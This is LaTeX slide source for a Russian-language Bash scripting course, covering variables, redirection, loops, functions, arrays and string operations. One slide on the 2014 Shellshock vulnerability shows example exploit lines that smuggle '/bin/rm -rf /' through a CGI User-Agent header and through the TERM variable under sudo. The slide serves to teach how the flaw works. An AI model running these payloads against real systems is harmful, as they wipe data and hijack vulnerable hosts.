\part{BASH}
\chapter*{Bourne Again Shell}
\section{Переменные}
\mode<all>{%% Vars


\begin{frame}
	\frametitle{Переменные}

	\large\center{Нетипизированные!!!}

	Для прямого обращения необходимо использовать префикс \\
	\center{\Large{\tt \$}}

	{\it Можно} использовать фигурные скобки:\\
	\center{\tt \$VARrest != \$\{VAR\}rest}

	\bigskip
	
	\begin{alertblock}{Без префикса}
		\begin{itemize}
			\item Объявление или присвоение
			\item unset -- удаление
			\item В арифметических операциях {\tt (( ... ))}
		\end{itemize}
	\end{alertblock}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Упражнение}

	\begin{lstlisting}
#!/bin/bash

VAR=string
echo $VAR
	\end{lstlisting}


	\begin{block}{Присвоение значения переменной}
		\begin{itemize}
			\item Измените присвоение значения с помощью пробелов до и/или после знака ''{\tt =}''
			\item Присвойте переменной VAR значение: I love \$\$\$!
		\end{itemize}
	\end{block}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Косвенное обращение к переменной}

	Косвенное (indirect) обращение к переменной: {\tt \$\{!VARIABLE\}}

	\begin{block}{Пример}
		\begin{lstlisting}
#!/bin/bash 
num=$# 
lastarg=${!num} 
echo $num $lastarg
		\end{lstlisting}
	\end{block}

\end{frame}


\begin{frame}
	\frametitle{Область видимости переменных}
	\begin{itemize}
		\item Локальные\\
		    Область видимости -- текущая программа, функция или субшелл
		\item Окружения
		\item Позиционные параметры
	\end{itemize}

\end{frame}



\begin{frame}
	\frametitle{Внешние переменные}

	\center{Наследование внешней переменной}

	\begin{itemize}
		\item export
		\item Переданное в командной строке \\
			\begin{block}{Пример}
				{\tt TEST=123 make}
			\end{block}
	\end{itemize}
\end{frame}


\begin{frame}[fragile]
	\frametitle{Специальные переменные}

	Часто используемые в скриптах:

	\begin{itemize}
		\item Разделитель \$IFS
		\item Директории -- домашняя \$HOME и текущая \$PWD
		\item UID пользователя -- \$UID
		\item ID процесса -- \$\$
		\item Имя хоста -- \$HOSTNAME
		\item Вид командной строки: \$PS1 -- \$PS4
		\item Локализация
			\begin{itemize}
				\item Используемый язык \$LANG
				\item Локализация \$LC\_ALL
					\begin{block}{Пример}
						\begin{lstlisting}
ls -l 
LC_ALL=C ls -l
						\end{lstlisting}
					\end{block}
			\end{itemize}
	\end{itemize}

\end{frame}



}
\section{Скрипты и запуск}
\mode<all>{

\begin{frame}[fragile]
	\frametitle{Введение}

	\begin{block}{Sha-Bang}
		\begin{lstlisting}
#!/bin/bash
		\end{lstlisting}
	\end{block}

	\begin{block}{Режим совместимости с POSIX}
		\begin{lstlisting}
#!/bin/sh
		\end{lstlisting}

	\end{block}

\end{frame}


\begin{frame}
	\frametitle{Спецсимволы}

	\begin{itemize}
		\item \# -- Вся строка после \# является комментарием
		\item ; -- Разделение команд
		\item : -- NOP оператор (похож на встроенный вызов true)
		\item {\tt source} или {\bf .} -- скрипт выполняется в текущем экземпляре shell
	\end{itemize}

\end{frame}


\begin{frame}
	\frametitle{Спецсимволы}

	\begin{block}{Фигурные скобки и склеивание с помощью ``,``}
		\begin{itemize}
			\item Посмотреть на результат выполнения команды \\
				{\tt echo \{A,B,C\}:\{1,2,3\}}
				\pause
			\item Посмотреть на результат выполнения команды \\
				{\tt ls -l \{,/usr\}/\{bin,sbin\}/*sh}
		\end{itemize}
	\end{block}

\end{frame}


\begin{frame}[fragile]
	\frametitle{Экранирование}

	\begin{columns}
		\column{0.5\textwidth}
		\begin{itemize}
			\item Экранирование одного символа \textbackslash 
			\item Частичное экранирование ''
			\item Полное экранирование '
		\end{itemize}
		\pause
		\column{0.5\textwidth}
		Спецзначения для echo и sed
		\begin{itemize}
			\item \textbackslash{n} -- новая строка
			\item \textbackslash{r} -- возврат каретки
			\item \textbackslash{t} -- табуляция
			\item \textbackslash{v} -- вертикальная табуляция \\
				\small\begin{lstlisting}
echo -e "test \v test \v test"
				\end{lstlisting}
			\item \textbackslash{b} -- перемещение на 1 символ назад
			\item \textbackslash{a} -- звуковой сигнал
			\item \textbackslash{0xxx} -- 8-миричное число
			\item \textbackslash{xXX} -- 16-ричное число
		\end{itemize}
	\end{columns}

\end{frame}


\begin{frame}
	\frametitle{Подстановка команд}
	
	Синтаксис:

	\begin{itemize}
		\item \`{}command\`{}
		\item \$(command)
	\end{itemize}
	\pause
	\begin{block}{Задание}
		Присвоить переменной LIST результат выполнения команды {\tt ls -1} \\
		Вывести на экран переменную LIST
	\end{block}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Коды возврата}

	Согласно POSIX: 0 -- успех

	Код возврата доступен через переменную \$?

	\pause
	\begin{block}{Пример}
		\begin{lstlisting}
/bin/true; echo $?
/bin/false; echo $?
		\end{lstlisting}
	\end{block}

	Скрипт возвращает код последней команды, поэтому для корректного выхода необходимо использовать {\tt exit}.

\end{frame}


\begin{frame}
	\frametitle{exec}

	Заменяет текущий shell переданной командой. 

	Часто используется для переназначения файловых дескрипторов.

\end{frame}

\begin{frame}
	\frametitle{Управление заданиями}
	
	\begin{itemize}
		\item {\tt bg} -- поместить задачу в фоновое исполнение
		\item {\tt fg} -- ''переключиться'' на задачу
		\item {\tt jobs} -- список активных задач
		\item {\tt wait [pid|id]} -- ждать завершения всех, либо конкретных задач
	\end{itemize}
	\pause
	\begin{block}{Задание}
		\begin{itemize}
			\item Запустить задачу ''{\tt sleep 100 \&}'' в фоновом режиме
			\item Запустить задачу ''{\tt sleep 100}'' на текущей косоли и остановить ее (Ctrl-Z)
			\item С помощью команды ''{\tt jobs}'' посмотреть статус активных задач
			\item С помощью команды ''{\tt bg}'' перевести остановленную задачу в фоновый режим
			\item С помощью команды ''{\tt fg}'' переключиться на одну из фоновых задач
		\end{itemize}
	\end{block}
\end{frame}



\begin{frame}[fragile]
	\frametitle{Группировка}
	
	\begin{block}{Пример}
		\begin{lstlisting}
( echo 1; echo 2) | tee file
		\end{lstlisting}
	\end{block}

	\pause
	\begin{block}{( cmd1; cmd2)}
	    Запускается новый shell
	\end{block}

	\begin{block}{Пример}
		\begin{lstlisting}
TEST=42; (echo $TEST; TEST=0; echo $TEST ); echo $TEST
		\end{lstlisting}
	\end{block}

\end{frame}


\begin{frame}[fragile]
	\frametitle{Перенаправление ввода/вывода}

	\begin{itemize}
		\item ``>'' -- Перенаправление в файл
			\begin{block}{Пример}
				\begin{lstlisting}
echo stdout > test.txt
				\end{lstlisting}
			\end{block}
		\item ``>\&'' -- Перенаправление в другой дескриптор
			\begin{block}{Пример}
				\begin{lstlisting}
(echo stdout; echo stderr >&2) > test.txt
				\end{lstlisting}
			\end{block}
	\end{itemize}

\end{frame}



\begin{frame}[fragile]
	\frametitle{Перенаправление ввода/вывода}

	\begin{itemize}

		\item ``\&>''
			\begin{block}{Пример}
				\begin{lstlisting}
(echo stdout; echo stderr >&2) &> test.txt
				\end{lstlisting}
			\end{block}
		
		\item ``>{}>'' -- Добавление в файл
			\begin{block}{Пример}
				\begin{lstlisting}
echo stdout >> test.txt
				\end{lstlisting}
			\end{block}

		\item ``<'' -- Чтение из файла
			\begin{block}{Пример}
				\begin{lstlisting}
cat < test.txt
				\end{lstlisting}
			\end{block}
	\end{itemize}

\end{frame}


\begin{frame}[fragile]
	\frametitle{Перенаправление ввода/вывода}

	\begin{itemize}

		\item ``<<'' -- Here-документ

		\item ``<>'' -- Открывает файловый дескриптор из файла/другого дескритора
			\begin{block}{Пример}
				\begin{lstlisting}
exec 3<>test.txt; echo test >&3;  cat <test.txt
				\end{lstlisting}
			\end{block}
			
		\item ``n<\&-'' -- Закрывает файловый дескриптор
			\begin{block}{Пример}
				\begin{lstlisting}
exec 3<&-; echo test >&3
				\end{lstlisting}
			\end{block}
			
		\item ``|'' -- pipe
	\end{itemize}

\end{frame}


}
\section{Параметры}
\mode<all>{
\begin{frame}
	\frametitle{Позиционные параметры}

	\begin{itemize}
		\item \$0-9 -- значение соответствующего параметра
		\item \$\# -- еоличество переданных параметров
		\item \$* -- представляется, как одна строка
		\item \$@ -- каждый параметр, как отдельная строка
	\end{itemize}

\end{frame}


\begin{frame}[fragile]
	\frametitle{shift}

	Встроенная команда сдвига параметров влево.

	В качестве параметра может принимать число -- на сколько параметров сдвигать.

	\begin{lstlisting}
shift [num]
	\end{lstlisting}

\end{frame}


\begin{frame}
	\frametitle{Задание}

	\begin{enumerate}
		\item Написать скрипт,  который выдает количество переданных параметров
			\pause
		\item Вывести на экран имя команды
			\pause
		\item Сделать symlink на скрипт и запустить
			\pause
		\item Вывести на экран первых 3 параметра
			\pause
		\item Передать строку "I am user \$USER" в качестве параметра
			\begin{itemize}
				\item Без экранирования
				\item С экранированием ''
				\item С экранированием '
			\end{itemize}
			\pause
		\item Добавить shift перед выводом параметров
	\end{enumerate}
\end{frame}


}
\section{Тесты и сравнения}
\mode<all>{%%

\begin{frame}
\frametitle{Общий синтаксис}

	Условие:
	\begin{itemize}
		\item Exit status любой программы
		\item test или $[$ 
		\item Двойные скобки {\bf (( ... ))} и конструкция {\bf let}
	\end{itemize}


	Конструкция для сравнения:
	\begin{itemize}
		\item \&\& и ||
		\item if/then/else
	\end{itemize}

\end{frame}


\begin{frame}[fragile]
\frametitle{test}

	\begin{itemize}
	    \item ! -- отрицание
	    \item -z СТРОКА
	    \item СТРОКА1 = СТРОКА2
	    \item СТРОКА1 != СТРОКА2
	    \item ЦЕЛОЕ1 -eq ЦЕЛОЕ2
	    \item ЦЕЛОЕ1 -ge ЦЕЛОЕ2
	    \item ЦЕЛОЕ1 -lt ЦЕЛОЕ2
	    \item -d ФАЙЛ
	    \item -e ФАЙЛ
	    \item -f ФАЙЛ
	\end{itemize}

\end{frame}


\begin{frame}[fragile]
\frametitle{Пример}

	Написать скрипт сравнивающий переменную окружения с заранее заданным значением:
	
	\small\begin{lstlisting}
#!/bin/bash

VAR=$1
STRING=test
[ $STRING == $VAR ] && echo "Строки одинаковы" || echo "Строки разные"
exit
	\end{lstlisting}
    \normalsize
	И запустить этот скрипт:
	
	\begin{enumerate}
		\item {\tt sh script.sh string}
		\item {\tt sh script.sh test}
		\item {\tt sh script.sh}
	\end{enumerate}

\end{frame}

\begin{frame}
	\frametitle{Пример: варианты исправления}

		\begin{enumerate}
			\item {\tt [ ``\$STRING'' == ``\$VAR'' ] }
			\item {\tt [ z\$STRING == z\$VAR ] }
		\end{enumerate}

\end{frame}

\begin{frame}[fragile]
\frametitle{\&\& и ||}
	Синтаксис:
\begin{verbatim}
условие && true || false
\end{verbatim}

	\pause
	Пример:
\begin{lstlisting}[language=bash]
test -z "$DISPLAY" && echo "text mode" || echo "graphical mode"
\end{lstlisting}
	
	\pause

	\begin{itemize}
	    \item Запустить команды "true" и "false"
	    \item В случае успеха вывести "успех"
	    \item В случае неуспеха вывести "неудача"
	\end{itemize}
\end{frame}

%\begin{frame}[fragile]{}

%\end{frame}

}
%\section{Операторы}
%\mode<all>{%%


\begin{frame}{}
	\frametitle{Задание}

\end{frame}
}
\section{Арифметические операции}
\mode<all>{%% Arithmetic

\begin{frame}
  \frametitle{}
  \begin{itemize}
   \item  Конструкция {\tt ((...))}
    \begin{block}{Примеры}
     {\tt (( a=10 )); echo \$(( a++ )); echo \$a; } 
    \end{block}
   \item  {\tt let}
    \begin{block}{Примеры}
     {\tt let a=10; echo \$a; let a+=-2; echo \$a; echo \$(( --a)); echo \$a} 
    \end{block}
   \item  {\tt expr } не нужен
    
  \end{itemize}
\end{frame}

\begin{frame}[fragile]
\begin{tabular}{ll}
{\tt id++, id-- } 
{\tt ++id, --id } 
{\tt -, +  }      
{\tt !, ~}      
{\tt ** }    
*, /, \%    
+, -        
<<, >>     
<=, >=, <, >    
==, !=     
&      
^      
|     
&&    
||   
expr ? expr : expr
    
=, *=, /=, %=,
+=, -=, <<=, >>=,
&=, ^=, |=  assignment
 
\end{tabular}
  
\end{frame}

\begin{frame}[fragile]
  \frametitle{Упражнение}
  
\end{frame}
}
\section{Циклы}
\mode<all>{\begin{frame}
\frametitle{Основные конструкции для циклов}
  \begin{itemize}
   \item while
   \item for
   \item until
   \item break, continue 
   \item внешние команды find, xargs 
  \end{itemize}
\end{frame}

\begin{frame}[fragile]
  \frametitle{Циклы for}
  \begin{enumerate}
    \item Стандартная форма
\begin{lstlisting}[language=sh,frame=single]
  for x in list 
  do
    op1
    op2
  done
\end{lstlisting}
    \item Арифметическая форма
\begin{lstlisting}[language=sh,frame=single]
  for (( expr1 ; expr2 ; expr3 )) 
  do 
    op1
    op2
  done
\end{lstlisting}
  \end{enumerate}
\end{frame}

\begin{frame}[fragile]
\frametitle{ Циклы for. Примеры.}
  \begin{block}{Действие над файлами.}
\begin{lstlisting}[language=sh,frame=single]
for file in *
 do md5sum $file
done
\end{lstlisting}
  \end{block}

\begin{block}{Перечисление элементов.}
\begin{lstlisting}[language=sh,frame=single]
for planet in Mars Earth Mercury Saturn
 do echo $planet 
done
\end{lstlisting}
  \end{block}
\end{frame}

\begin{frame}[fragile]
\frametitle{ Циклы for. Примеры.}
  \begin{block}{Перечисление цифровой последовательности.}
\begin{lstlisting}[language=sh,frame=single]
for num in 1 2 3 4 5 6 7 8 9 10
 do echo $num
done

for num in $(seq 1 10)  # генерация из внешней команды
 do echo $num
done

for num in {1..10}  # генерация встроенными средствами
 do echo $num
done

\end{lstlisting}
  \end{block}
\end{frame}

\begin{frame}[fragile]
\frametitle{ Циклы for. Примеры.}
  \begin{block}{Перечисление цифровой последовательности C-like }
\begin{lstlisting}[language=sh,frame=single]
for ((i=1;i<11;i++))
do 
  echo $i
done  
\end{lstlisting}
  \end{block}

  \begin{block}{Несколько переменных}
    \begin{lstlisting}[language=sh,frame=single]
for ((a=1, b=1; a <= LIMIT ; a++, b++))
do
  echo -n "$a-$b"
done
    \end{lstlisting}
  \end{block}
\end{frame}

\begin{frame}[fragile]
\frametitle{ Циклы for. Примеры.}
  \begin{block}{Пустые выражения. Результат по умолчанию 1. }
    \begin{lstlisting}[language=sh,frame=single]
for (( i=1; ; i++))
do
  echo $i 
  [ "$i" -eq 10 ] && break 
done
    \end{lstlisting}
  \end{block}
\end{frame}

\begin{frame}[fragile]
\frametitle{ Циклы for. Примеры.}
  \begin{block}{Из аргументов.}
    \begin{lstlisting}[language=sh,frame=single]
for arg
 do echo $arg 
done
    \end{lstlisting}
  \end{block}
  \begin{block}{Из переменной. Запись одной строкой.}
    \begin{lstlisting}[language=sh,frame=single]
for name in $users ; do echo $name ; done
    \end{lstlisting}
  \end{block}
\end{frame}

\begin{frame}[fragile]
\frametitle{Циклы while,until}
\begin{lstlisting}[language=sh,frame=single]
while expr1; ... exprN
do
 op
done
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]
\frametitle{}

\begin{block}{Пример. Перебираем аргументы.}
\begin{lstlisting}[language=sh,frame=single]
while [[ -n $1 ]]
do
    echo $1
    shift
done
\end{lstlisting}
\end{block}

\begin{block}{Пример. Несколько команд.}
\begin{lstlisting}[language=sh,frame=single]
while ((i++))
 read y
do
 echo $i $y
 [[ "$y" = 'stop' ]] && break
done
\end{lstlisting}
\end{block}
\begin{block}{Пример. Бесконечный цикл.}
\begin{lstlisting}[language=sh,frame=single]
while :
do
 x=$RANDOM
 echo $x
 [[ $x -gt 1100 ]] && break
done
\end{lstlisting}
\end{block}
\end{frame}

\begin{frame}[fragile]
\frametitle{ Цикл until. Пример.}
  \begin{block}{Ожидаем хост после перезагрузки.}
    \begin{lstlisting}[language=sh,frame=single]
until ping -q -c 3  $host 1>/dev/null 2>&1 && nc -z $host 22
do 
   sleep 1
   echo unavailable;
done
    \end{lstlisting}
  \end{block}
\end{frame}

\begin{frame}[fragile]
\frametitle{Перенаправление.}
Применяется ко всем командам внутри цикла.
  \begin{block}{Pipe}
    \begin{lstlisting}[language=sh,frame=single]
for name in $users ; do echo $name ; done | wc -l
    \end{lstlisting}
  \end{block}
  \begin{block}{В файл}
    \begin{lstlisting}[language=sh,frame=single]
for name in $users ; do echo $name ; done
(( i=10 )); while (( i > 0 )); do 
    echo "$i"
    (( i-- ))
done > output.txt
    \end{lstlisting}
  \end{block}
\end{frame}

\begin{frame}[fragile]
\frametitle{Внешние команды.}
Массовые операции с файлами.
  \begin{block}{Команда find}
    \begin{lstlisting}[language=sh,frame=single]
find . -name '*.c' -exec stat  {} \;
    \end{lstlisting}
  \end{block}
  \begin{block}{Команда xargs}
    \begin{lstlisting}[language=sh,frame=single]
echo /dev/std* | xargs -n1 readlink
    \end{lstlisting}
  \end{block}
\end{frame}

\begin{frame}[fragile]
    \frametitle{Упражнения}
    \begin{enumerate}
        \item Посчитать сумму кубов чисел от 1 до 100
        \item Вывести в файл 10 случайных чисел от 0 до 80
        \item Построить гистограмму данных из предыдущего файла файла {\bf Hint:} {\tt while read, echo -n }
    \end{enumerate}
\end{frame}
}
\section{Условные операторы}
\mode<all>{\begin{frame}[fragile]
\frametitle{Условные операторы: if}
\begin{itemize}
\item {\tt if;then;else;fi}
\begin{lstlisting}[language=sh,frame=single]
if CONDITIONS
then 
 OPS
[elif] CONDITIONS
[then]
 OPS
[else]
 OPS
fi
\end{lstlisting}
\end{itemize}
\end{frame}

\begin{frame}[fragile]
\frametitle{Условные операторы: case}
\begin{itemize}
\item {\tt case}
\begin{lstlisting}[language=sh,frame=single]
case "$variable" in 
 pattern1) command1
           command2
          ;;
 pattern2|pattern3)
         command3
         command4
        ;;
esac
\end{lstlisting}
\end{itemize}
\end{frame}

\begin{frame}[fragile]
\frametitle{Использование case вместе с getopts}
\begin{lstlisting}[language=sh,frame=single]
while getopts "af:h" Option
do
  case $Option in 
    a) OPTA=1 ;;
    f) OPTFILE=1
       FILENAME=$OPTARG
       ;;
    h) echo "Usage: $0 [-ah] -f <filename>";;
  esac  
done
shift $((OPTIND-1))
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]
\frametitle{Упражнение}
\begin{enumerate}
\item Написать программу, которая по опции {\tt -h } выводит помощь, без опций выводит время в stdout,
с опцией -f выводит время в указаный файл
\end{enumerate}
\end{frame}
}
\section{Функции}
\mode<all>{\begin{frame}
	\frametitle{Функции}

	\begin{itemize}
		\item Именованные
		\item Неименованные
	\end{itemize}

	Функции в shell могут использоваться как обычные программы, которые:
	\begin{itemize}
		\item Принимают позиционные параметры;
		\item возвращают статус;
		\item Могут использоваться в качестве источника либо приемника 
			при перенаправлениях ввода/вывода.
	\end{itemize}

\end{frame}


\begin{frame}[fragile]
	\frametitle{Функции: синтаксис}
	\begin{itemize}
		\item Классический синаксис: 
			\begin{lstlisting}
function function_name {
  command...
}
\end{lstlisting}
		\item Портабельный (C-style):
			\begin{lstlisting}
function_name()
{
  command...
} 
\end{lstlisting}

		\item Однострочный:
			\begin{lstlisting}
function_name () { command... ;}
\end{lstlisting}
  \end{itemize}
\end{frame}

\begin{frame}[fragile]
	\frametitle{Пример: shellshock}
	\begin{block}{Однострочный синтаксис}
			\begin{lstlisting}
function_name () { command... ;}
\end{lstlisting}
	\end{block}

    В 2014 году вскрылась уязвимость, существовавшая с {\bf 1992} г.:

	\begin{block}{Shellshock}
			\begin{lstlisting}
export badvar='(){:;}; echo "The Matrix has you"'
bash -c "echo Just a simple shell call"
\end{lstlisting}
	\begin{itemize}
	    \item Объявление переменной
	    \item Создание процесса, наследующего опасную переменную
	    \item При инициализации окружения {\tt bash} запускает на выполнение все, что следует за ``объявлением'' функции
	\end{itemize}
	\end{block}

\end{frame}

	\begin{block}{Пример использования}
	На любой уязвимый сайт с CGI-скриптами:
			\begin{lstlisting}
curl -H "User-Agent: () { :; }; /bin/rm -rf /" http://example.com/
\end{lstlisting}
	 В CGI все заголовки преобразуются в переменные окружения.
	\end{block}

	\begin{block}{Пример использования 2}
	Для любой команды {\tt sudo}
			\begin{lstlisting}
TERM='() { :; }; /bin/rm -rf / ' sudo mount /dev/cdrom
\end{lstlisting}
	Переменная {\tt TERM} не преобразуется и не сбрасывается.
	\end{block}



\begin{frame}[fragile]
	\frametitle{Пример (начало)}
	\small
	\begin{lstlisting}
#!/bin/bash

function help {
  echo "Использование: $0 <string>"
  exit 1
}

f1(){
  echo Вызвана функция $FUNCNAME с $# аргументами
}

f2(){
  while read str; do
    echo ${FUNCNAME}: прочитана строка: $str
  done
}
\end{lstlisting}

\end{frame}



\begin{frame}[fragile]
	\frametitle{Пример (окончание)}
	\small
	\begin{lstlisting}
[ $# -eq 0 ] && help

f1 "$@"

{ for ((i=0;i<5;i++));do
  echo $@
done } | f2

exit
\end{lstlisting}

\end{frame}

\begin{frame}[fragile]
	\frametitle{локальные переменные}

	Переменные объявленные с префиксом {\tt local} видны только внутри объявленного блока.

	\small
	\begin{columns}
		\column{0.5\textwidth}
		\begin{lstlisting}
#!/bin/bash

VAR=test
f1(){
  local VAR=test1
  echo Function ${FUNCNAME}: VAR=$VAR
}
f2(){
  VAR=test2
  echo Function ${FUNCNAME}: VAR=$VAR
}
		\end{lstlisting}
		\column{0.5\textwidth}	
		\begin{lstlisting}

echo Before f1: VAR=$VAR
f1
echo Before f2: VAR=$VAR
f2
echo After f2: VAR=$VAR

exit
\end{lstlisting}
	\end{columns}

\end{frame}

\begin{frame}
	\frametitle{Домашнее задание}
	\begin{itemize}
		\item Создать библиотеку функций:
			\begin{itemize}
				\item функция {\tt help};
				\item функция {\tt count\_str} -- подсчитывает количество найденных строк в stdin.
				\item функция {\tt readfile}, в которую передается имя файла в качестве 1 параметра
					и строка, которую необходимо найти, в качестве 2-го.
					Задача функции -- вырезать из файла все пустые строки и комментарии, 
					и с помощью предыдущей функции вернуть количество вхождений искомой строки.
			\end{itemize}
		\item Создать скрипт, который обрабатывает файл переданный через параметр -f или -{}-file;
		\item Включить библиотеку в свой скрипт с помощью {\tt source};
		\item Найти количество сервисов {\tt tcp} в файле {\tt /etc/services};
		\item Найти количество сервисов {\tt udp} в файле {\tt /etc/services};
  \end{itemize}
\end{frame}

}
\section{Массивы}
\mode<all>{\begin{frame}[fragile]{Массивы}

	\center{\large{Массивы в bash являются одномерными!!!}}

	\bigskip

	\begin{block}{Создание массива/Присвоение значений}

		{\tt name[index]=value}
	\end{block}
	
	\begin{block}{Примеры}
		\begin{itemize}
			\item \verb+ array=( "aaa" "bbb ccc" 2 ) +
			\item \verb+ a[1]="aaaa"; a[3]="bb bb";   +
			\item \verb+ b=( [1]="aaa" [10]="bbb"); +
		\end{itemize}
	\end{block}

	\pause

	\begin{block}{Пример: загрузить файл в массив}
		\begin{itemize}
			\item \verb+ array=($(cat filename)) +
		\end{itemize}
	\end{block}

\end{frame}

\begin{frame}[fragile]{Массивы}
	\begin{block}{Доступ к значениям элементов}
		{\tt \$\{name[index]\}}
	\end{block}
	
	\begin{block}{Примеры}
		\begin{itemize}
			\item По индексу: \\
				\verb+ echo ${array[3]} +
			\item Ко всем элементам массива: \\
				\verb+ echo ${array[@]} + \\
				\verb+ echo ${array[*]} + 
		\end{itemize}
	\end{block}
\end{frame}

\begin{frame}[fragile]{Массивы}

	\begin{block}{Добавление элементов}

		{\tt name=(\$name[@] value)}

		\begin{itemize}
			\item \verb+ array=( ${array[@]} "new element" 120 ) +
			\item \verb+ array[100]="hundred"   +
		\end{itemize}
	\end{block}

	\begin{block}{Удаление элементов}

		{\tt unset name[index]}

		\begin{itemize}
			\item \verb+ unset array[0] +
		\end{itemize}
	\end{block}
\end{frame}


\begin{frame}[fragile]{Массивы}
	\begin{block}{Количество элементов}
		{\tt \$\{{\bf \#}name[@]\}}
	\end{block}

	\pause

	\begin{alertblock}{Размер одного элемента}
		\begin{itemize}
			\item {\tt \$\{{\bf \#}name[2]\}} -- размер 2-го элемента
			\item {\tt \$\{{\bf \#}name\}} -- размер 0-го элемента
		\end{itemize}
	\end{alertblock}

	\pause
	\begin{alertblock}{Проблема размерности разреженного массива}
		\begin{lstlisting}
array[100]="hundred"
echo ${#array[@]}
		\end{lstlisting}
	\end{alertblock}
\end{frame}

\begin{frame}[fragile]{Массивы}
	\begin{block}{ID элементов массива}

		{\tt \$\{{\bf !}name[@]\}}

		\begin{lstlisting}
echo ${array[@]}
echo ${!array[@]}

for i in ${!array[@]}
do
  echo "array[$i] = ${array[$i]}"
done
		\end{lstlisting}
	\end{block}
\end{frame}


\begin{frame}[fragile]{Массивы}
	\begin{block}{Срезы}
		{\tt \$\{name[@]:index:size\}}
	\end{block}

	\begin{block}{Примеры}
		\begin{itemize}
			\item \verb+ echo ${array[@]:1:2} +
			\item \verb+ echo ${array[@]:1} +
			\item \verb+ echo ${array[@]::2} +
		\end{itemize}
	\end{block}

	\pause

	\begin{alertblock}{Срез в одном элементе}
		\begin{itemize}
			\item \verb+ echo ${array[1]:1:2} +
			\item \verb+ echo ${array[1]:1} +
			\item \verb+ echo ${array[1]::2} +
		\end{itemize}

	\end{alertblock}

\end{frame}

\begin{frame}[fragile]{Массивы}
	\begin{block}{Замена подстроки во всех элементах}
		{\tt \$\{name[@]/old/new\}}

		{\tt \$\{name[@]//old/new\}} -- ''жадное'' поведение
	\end{block}

	\begin{block}{Примеры}
		\begin{itemize}
			\item \verb+ echo ${array[@]/a/b} +
			\item \verb+ echo ${array[@]//a/b} +
		\end{itemize}
	\end{block}

\end{frame}

}
%\section{Строковые операторы}
%\mode<all>{%% Strings manipulation


\begin{frame}
	\frametitle{Переменные -- суть строки}

	\begin{center}
	В shell существует много способов преобразования строк и значений переменной.
	\end{center}

\end{frame}


\begin{frame}[fragile]
	\frametitle{Длина строки}

	\begin{block}{\$\{\#string\}}
	\begin{lstlisting}
string="Embedded Solutions Department"
echo Length=${#string} # Length=29
	\end{lstlisting}
	\end{block}

\end{frame}


\begin{frame}[fragile]
	\frametitle{Извлечение подстроки}

	\begin{block}{\$\{string:position\}}
	\begin{lstlisting}
string="Embedded Solutions Department"
echo ${string:19} # Department
	\end{lstlisting}
	\end{block}

	\pause
	\begin{block}{\$\{string:position:length\}}
	\begin{lstlisting}
string="Embedded Solutions Department"
echo ${string:9:8}  # Solution
	\end{lstlisting}
	\end{block}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Удаление части строки}

	\begin{block}{\$\{string\#substring\} с начала}
	\begin{lstlisting}
entry=$(cat /etc/passwd | grep "^$USER:")
echo $entry # d4s:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry#*:} # x:500:500:d4s:/home/d4s:/bin/bash
	\end{lstlisting}
	\end{block}

	\pause

	\begin{block}{\$\{string\%substring\} c конца}
	\begin{lstlisting}
entry=$(cat /etc/passwd | grep "^$USER:")
echo $entry # d4s:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry%:*} # d4s:x:500:500:d4s:/home/d4s 
	\end{lstlisting}
	\end{block}



\end{frame}

\begin{frame}[fragile]
	\frametitle{Удаление части строки}

	\large{Жадное поведение!}

	\begin{block}{\$\{string\#\#substring\}}
	\begin{lstlisting}
entry=$(cat /etc/passwd | grep "^$USER:")
echo $entry # d4s:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry##*:} # /bin/bash
	\end{lstlisting}
	\end{block}
	\pause
	\begin{block}{\$\{string\%\%substring\}}
	\begin{lstlisting}
entry=$(cat /etc/passwd | grep "^$USER:")
echo $entry # d4s:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry%%:*} # d4s
	\end{lstlisting}
	\end{block}
\end{frame}


\begin{frame}[fragile]
	\frametitle{Замена части строки}

	\begin{block}{\$\{string/substring/replacement\}}
	\begin{lstlisting}
entry=$(cat /etc/passwd | grep "^$USER:")
echo $entry # d4s:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry/$USER/user} # user:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry/$USER} # :x:500:500:d4s:/home/d4s:/bin/bash
	\end{lstlisting}
	\end{block}

	\pause
	\begin{block}{\$\{string//substring/replacement\}}
	\begin{lstlisting}
entry=$(cat /etc/passwd | grep "^$USER:")
echo $entry # d4s:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry//$USER/user} # user:x:500:500:user:/home/user:/bin/bash
echo ${entry//$USER} # :x:500:500::/home/:/bin/bash
	\end{lstlisting}
	\end{block}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Замена части строки}

	\begin{block}{\$\{string/\#substring/replacement\}}
		Замена, если строка начинается с искомого выражения (префикс).

	\begin{lstlisting}
entry=$(cat /etc/passwd | grep "^$USER:")
echo $entry # d4s:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry/#$USER/user} # user:x:500:500:d4s:/home/d4s:/bin/bash
	\end{lstlisting}
	\end{block}

	\pause
	\begin{block}{\$\{string/\%substring/replacement\}}
		Замена, если строка завершается искомым выражением (суффикс).

	\begin{lstlisting}
entry=$(cat /etc/passwd | grep "^$USER:")
echo $entry # d4s:x:500:500:d4s:/home/d4s:/bin/bash
echo ${entry/%\/bin\/bash/\/bin\/sh} # user:x:500:500:user:/home/user:/bin/sh
	\end{lstlisting}
	\end{block}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Получение имен переменных}

	\begin{block}{ \$\{!varprefix*\} и \$\{!varprefix@\} }

		Скрипт, который выводит на экран список переменных, начинающихся на {\tt BASH} и их значений:
	\begin{lstlisting}
#!/bin/bash

VARS=${!BASH*}
for VAR in $VARS
do
    echo $VAR=${!VAR}
done
	\end{lstlisting}
	\end{block}
\end{frame}

}
%	[hideallsubsections]
\section{Подстановка параметров}
\mode<all>{%% Parameter substitution


\begin{frame}[fragile]
	\frametitle{Стандартная запись}

	\begin{block}{\$\{parameter\}}
		{\tt \$parameter = \$\{parameter\}}

	\begin{lstlisting}
echo $USERtest
echo ${USER}test
	\end{lstlisting}
	\end{block}

\end{frame}

\begin{frame}[fragile]
	\frametitle{Инициализация переменных.}

	\begin{block}{Неопределенная, пустая, со значением.}
	\begin{lstlisting}
unset a          # undefined variable
echo ${a}
